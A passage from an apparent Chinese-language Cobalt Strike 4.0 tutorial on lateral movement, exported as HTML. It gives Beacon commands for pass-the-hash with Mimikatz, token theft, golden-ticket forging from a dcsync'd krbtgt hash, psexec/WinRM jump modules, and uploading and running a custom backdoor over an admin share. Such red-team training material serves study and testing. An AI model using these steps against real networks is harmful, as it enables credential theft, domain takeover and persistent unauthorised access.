		<p class="cs40DD2BC9"><span class="cs9C1B1871">在进行这个过程中，会使用到</span><span class="cs8926E06">cmd.exe</span><span class="cs9C1B1871">回传</span><span class="cs8926E06">token</span><span class="cs9C1B1871">到</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">，还会对内存进行读取操作，</span><span class="cs9FB05234">pth</span><span class="cs9C1B1871">命令需要你在一个有权限的环境下使用。通过</span><span class="cs8926E06">cmd.exe</span><span class="cs9C1B1871">执行命令动作比较大，不建议使用</span><span class="cs8926E06">pth</span><span class="cs9C1B1871">命令。使用</span><span class="cs8926E06">rundll32.exe</span><span class="cs9C1B1871">创建</span><span class="cs8926E06">64</span><span class="cs9C1B1871">位进程可能会出问题，建议使用</span><span class="cs8926E06">dllhost.exe</span><span class="cs9C1B1871">。</span></p><p class="cs3A447A38"><span class="cs9FB05234">spwanto x64 c:\windows\system32\dllhost.exe</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">举例说明：</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">（</span><span class="cs8926E06">1</span><span class="cs9C1B1871">）</span><span class="cs8926E06">ntlm hash</span><span class="cs9C1B1871">：</span><span class="cs8926E06"><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/8.Lateral_Movement/8-lateral-movement%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8_files/image7.png" width="560" height="40" alt="" style="border-width:0px;" /><br/></span><span class="cs9C1B1871">（</span><span class="cs8926E06">2</span><span class="cs9C1B1871">）</span><span class="cs8926E06">pth<br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/8.Lateral_Movement/8-lateral-movement%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8_files/image8.png" width="560" height="302" alt="" style="border-width:0px;" /></span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">使用</span><span class="cs8926E06">Mimikatz</span><span class="cs9C1B1871">传递</span><span class="cs8926E06">hash</span></li></ul>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9FB05234">mimikatz sekurlsa::pth /user:</span><span class="cs7FFD2630">用户名</span><span class="cs9FB05234"> /domain:</span><span class="cs7FFD2630">域名</span><span class="cs9FB05234"> /ntlm:</span><span class="cs7FFD2630">哈希</span><span class="cs9FB05234"> /run:&quot;powershell -w hidden&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">steal_token pid</span></li><li class="cs24C36B3"><span class="cs8926E06"><br/></span><span class="cs9C1B1871">当你通过</span><span class="cs8926E06">Beacon</span><span class="cs9C1B1871">获取到这个</span><span class="cs8926E06">access token</span><span class="cs9C1B1871">后，之后进行的操作仍然会通过这个进程来执行。</span></li></ul>
		<ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs8926E06">kerberos tickets<br/></span><span class="cs9FB05234">Kerberos</span><span class="cs9C1B1871">是一个通过密钥系统为客户机</span><span class="cs8926E06"> / </span><span class="cs9C1B1871">服务器应用程序提供强大的认证服务，具体此处不再详述。我们可以通过</span><span class="cs8926E06">Kerberos tickets</span><span class="cs9C1B1871">来进行认证登录到服务器</span></li></ol>
		<p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/CobaltStrike4.0/8.Lateral_Movement/8-lateral-movement%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8_files/image9.png" width="560" height="557" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234"># Beacon console</span><span class="cs7FFD2630">执行</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">查看本地存储的</span><span class="cs9FB05234">Kerberos tickets</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">run klist</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">清除票据</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">kerberos_ticket_purge</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">加载票据</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">kerberos_ticket_use [/path/file.ticket]</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">伪造黄金票据（</span><span class="cs8926E06">Golden Ticket</span><span class="cs9C1B1871">，即上图的</span><span class="cs8926E06">ST</span><span class="cs9C1B1871">）</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">需要知道用户名和域名称：执行</span><span class="cs9FB05234">net domain</span></li><li class="cs24C36B3"><span class="cs9C1B1871">域</span><span class="cs8926E06">SID</span><span class="cs9C1B1871">：执行</span><span class="cs9FB05234">whoami /user</span><span class="cs9C1B1871">，丢掉最后一段数即可，可参考下图</span></li><li class="cs24C36B3"><span class="cs9C1B1871">域控上的</span><span class="cs8926E06">krbtgt</span><span class="cs9C1B1871">用户的</span><span class="cs8926E06">NTLM hash</span><span class="cs9C1B1871">：用</span><span class="cs9FB05234">dcsync</span><span class="cs9C1B1871">导出</span></li></ul>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">这个票据实际上仅仅只能有效几个小时，使用</span><span class="cs8926E06">klist</span><span class="cs9C1B1871">查看票据可看到票据的</span><span class="cs9FB05234">end time</span><span class="cs9C1B1871">，即为有效时间</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/CobaltStrike4.0/8.Lateral_Movement/8-lateral-movement%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8_files/image10.png" width="560" height="301" alt="" style="border-width:0px;" /></span><span class="cs8926E06"><br/>beacon</span><span class="cs9C1B1871">右键</span><span class="cs8926E06"> &gt; </span><span class="cs9FB05234">Access</span><span class="cs8926E06"> &gt; </span><span class="cs9FB05234">Golden Ticket</span><span class="cs8926E06"><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/8.Lateral_Movement/8-lateral-movement%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8_files/image11.png" width="560" height="307" alt="" style="border-width:0px;" /><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/8.Lateral_Movement/8-lateral-movement%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8_files/image12.png" width="560" height="292" alt="" style="border-width:0px;" /><br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/8.Lateral_Movement/8-lateral-movement%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8_files/image13.png" width="560" height="336" alt="" style="border-width:0px;" /><br/></span><span class="cs9C1B1871">另外你在使用</span><span class="cs9FB05234">BIOS Name</span><span class="cs9C1B1871">、</span><span class="cs9FB05234">Domain Name</span><span class="cs9C1B1871">、</span><span class="cs9FB05234">IP address</span><span class="cs9C1B1871">访问主机时，会影响你使用凭据进行认证的结果</span></p><h2 class="cs868C439D">
			<a name="Xe1f36418321882ddd46d160e124fd071097a4a6"><span class="csB2D98684">0x05 Remote Code Execution</span></a></h2>
		<h3 class="cs868C439D">
			<a name="Xfe2bf8b8375deecc1971f834cd3c2842092e9d2"><span class="csD1E291E2">1. </span><span class="csD6CA00D2">横向移动自动化工具</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">targets</span><span class="cs9C1B1871">列表</span><span class="cs8926E06"> </span><span class="cs9C1B1871">右键</span><span class="cs8926E06"> &gt; jump &gt; </span><span class="cs9C1B1871">某一个</span><span class="cs8926E06">module</span></p><p class="cs3A447A38"><span class="cs9FB05234"># </span><span class="cs7FFD2630">通过某个模块连接至某个主机</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">jump [module] [target] [listener]</span></p><table class="cs2D2816FE" border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse;">
			<tr>
				<td class="csC48167EA" valign="bottom"><p class="csA622D344"><span class="cs9C1B1871">模块</span></p></td><td class="csC48167EA" valign="bottom"><p class="csA622D344"><span class="cs9C1B1871">架构</span></p></td><td class="csC48167EA" valign="bottom"><p class="csE0FE76B"><span class="cs9C1B1871">描述</span></p></td></tr>
			<tr>
				<td class="csE35A2CA7" valign="top"><p class="csA622D344"><span class="cs8926E06">psexec</span></p></td><td class="csE35A2CA7" valign="top"><p class="csA622D344"><span class="cs8926E06">x86</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs9C1B1871">通过一个新的服务运行一个</span><span class="cs8926E06">exe</span><span class="cs9C1B1871">服务</span></p></td></tr>
			<tr>
				<td class="csE35A2CA7" valign="top"><p class="csA622D344"><span class="cs8926E06">psexec64</span></p></td><td class="csE35A2CA7" valign="top"><p class="csA622D344"><span class="cs8926E06">x64</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs9C1B1871">通过一个新的服务运行一个</span><span class="cs8926E06">exe</span><span class="cs9C1B1871">服务</span></p></td></tr>
			<tr>
				<td class="csE35A2CA7" valign="top"><p class="csA622D344"><span class="cs8926E06">psexec_psh</span></p></td><td class="csE35A2CA7" valign="top"><p class="csA622D344"><span class="cs8926E06">x86</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs9C1B1871">通过一个新服务来运行</span><span class="cs8926E06">powershell</span><span class="cs9C1B1871">一句话，从而运行管道绑定</span><span class="cs8926E06">stager</span></p></td></tr>
			<tr>
				<td class="csE35A2CA7" valign="top"><p class="csA622D344"><span class="cs8926E06">winrm</span></p></td><td class="csE35A2CA7" valign="top"><p class="csA622D344"><span class="cs8926E06">x86</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs9C1B1871">通过</span><span class="cs8926E06">WinRM</span><span class="cs9C1B1871">执行</span><span class="cs8926E06">powershell</span><span class="cs9C1B1871">脚本</span></p></td></tr>
			<tr>
				<td class="csE35A2CA7" valign="top"><p class="csA622D344"><span class="cs8926E06">winrm64</span></p></td><td class="csE35A2CA7" valign="top"><p class="csA622D344"><span class="cs8926E06">x64</span></p></td><td class="csE35A2CA7" valign="top"><p class="csE0FE76B"><span class="cs9C1B1871">通过</span><span class="cs8926E06">WinRM</span><span class="cs9C1B1871">执行</span><span class="cs8926E06">powershell</span><span class="cs9C1B1871">脚本</span></p></td></tr>
		</table>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">使用</span><span class="cs8926E06">wirm64<br/><img src="安全工具/CobaltStrike/CobaltStrike4.0/8.Lateral_Movement/8-lateral-movement%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8_files/image14.png" width="560" height="326" alt="" style="border-width:0px;" /><br/></span><span class="cs9C1B1871">等同于执行</span><span class="cs9FB05234">jump winrm64 FILESERVER local - smb</span></p><h3 class="cs868C439D">
			<a name="X8543c94fcdc4e7a9b24272af8576f00b5d65c8a"><span class="csD1E291E2">2. </span><span class="csD6CA00D2">执行自定义后门程序</span></a></h3>
		<ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">与你的目标建立信任关系</span></li><li class="cs63189908"><span class="cs9C1B1871">生成一个适合的后门</span><span class="cs8926E06"><br/>Attack &gt; Packages</span><span class="cs9C1B1871">　</span><span class="cs8926E06">&gt; Windows executable(s)<br/></span><span class="cs9C1B1871">建议使用</span><span class="cs8926E06">stageless</span><span class="cs9C1B1871">类型的后门</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">后门可以是以下形式</span></li><li class="cs63189908"><span class="cs8926E06">windows exe </span><span class="cs9C1B1871">作为系统服务</span></li><li class="cs63189908"><span class="cs8926E06">windows exe</span><span class="cs9C1B1871">程序</span></li><li class="cs63189908"><span class="cs8926E06">dll</span><span class="cs9C1B1871">等</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">使用</span><span class="cs8926E06">tcp Beacon</span><span class="cs9C1B1871">或者</span><span class="cs8926E06">smb beacon</span><span class="cs9C1B1871">类型的</span><span class="cs8926E06">payload</span></li><li class="cs63189908"><span class="cs9C1B1871">上传后门到目标主机上</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">可以使用</span><span class="cs9FB05234">File Browser</span><span class="cs9C1B1871">，通过输入</span><span class="cs8926E06">UNC</span><span class="cs9C1B1871">共享目录来上传文件。也可以使用命令上传：</span></li></ol>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9FB05234">cd \\host\C$\windows\temp</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">upload /path/file.exe</span></li></ul>
		<ol start="7" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">在目标主机上运行这个后门</span></li></ol>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9FB05234"># </span><span class="cs7FFD2630">查看在</span><span class="cs9FB05234">Cobalt Strike</span><span class="cs7FFD2630">中注册的远程执行模块的列表</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">remote-exec</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">在一个远程主机上执行命令</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># psexec</span><span class="cs7FFD2630">、</span><span class="cs9FB05234">winrm</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">powershell</span><span class="cs7FFD2630">）、</span><span class="cs9FB05234">wmi</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">powershell</span><span class="cs7FFD2630">）</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">remote-exec [method] [target] [command]</span></li><li class="cs24C36B3"><span class="cs8926E06">&nbsp;</span></li></ul>
		<ol start="8" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">通过后门进行控制</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">成功执行后可以通过</span><span class="cs9FB05234">link</span><span class="cs9C1B1871">和</span><span class="cs9FB05234">connect</span><span class="cs9C1B1871">连接到</span><span class="cs8926E06">Beacon</span></li></ol>
		<h2 class="cs868C439D">
			<a name="X3816d5ade7c24b9bbda940f6da5ff4c705b80c3"><span class="csB2D98684">0x06 </span><span class="cs83F14626">注意事项</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">当你第一次连接到</span><span class="cs8926E06">session</span><span class="cs9C1B1871">时，你的认证信息可能会不起作用，需要使用</span><span class="cs9FB05234">make_token</span><span class="cs9C1B1871">来复制你的</span><span class="cs8926E06">access token</span><span class="cs9C1B1871">填充至凭据中。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如果当你在进行</span><span class="cs8926E06">make_token</span><span class="cs9C1B1871">或者</span><span class="cs8926E06">steal_token</span><span class="cs9C1B1871">时，你不能够运行进程，或者你看不到输出结果时，可以使用</span><span class="cs9FB05234">inject</span><span class="cs9C1B1871">迁移到另一个进程中进行执行，或者使用</span><span class="cs9FB05234">elevate svc-exe</span><span class="cs9C1B1871">来作为系统运行</span><span class="cs8926E06">payloa</span></p></body>
</html>
